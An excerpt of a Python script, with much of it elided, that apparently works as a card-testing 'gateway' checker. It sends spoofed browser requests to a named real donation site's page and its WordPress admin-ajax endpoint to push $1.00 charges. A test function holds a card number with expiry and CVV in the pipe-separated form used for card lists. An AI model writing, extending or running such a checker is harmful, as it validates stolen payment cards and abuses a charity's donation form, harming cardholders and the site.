...
def pp(ccx, amount="1.00", retry_count=1):
    ...
    try:
        ...
        response = r.get('https://allpathstogod.com/support-the-movement/', headers=headers, timeout=20)
        ...
        headers = {
            ...
            'origin': 'https://allpathstogod.com',
            'referer': 'https://allpathstogod.com/support-the-movement/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        ...
        data = {
            ...
            'give-current-url': 'https://allpathstogod.com/support-the-movement/',
            'give-form-url': 'https://allpathstogod.com/support-the-movement/',
        ...
        response = r.post('https://allpathstogod.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
        ...
        multipart_data = MultipartEncoder({
            ...
            'give-current-url': (None, 'https://allpathstogod.com/support-the-movement/'),
            'give-form-url': (None, 'https://allpathstogod.com/support-the-movement/'),
        ...
        response = r.post(
            'https://allpathstogod.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data,
            timeout=20,
...
def test_gateway():
    test_cc = "4934228723375366|07|2029|218"
    print("🔍 Testing allpathstogod.com gateway...")
    start = time.time()
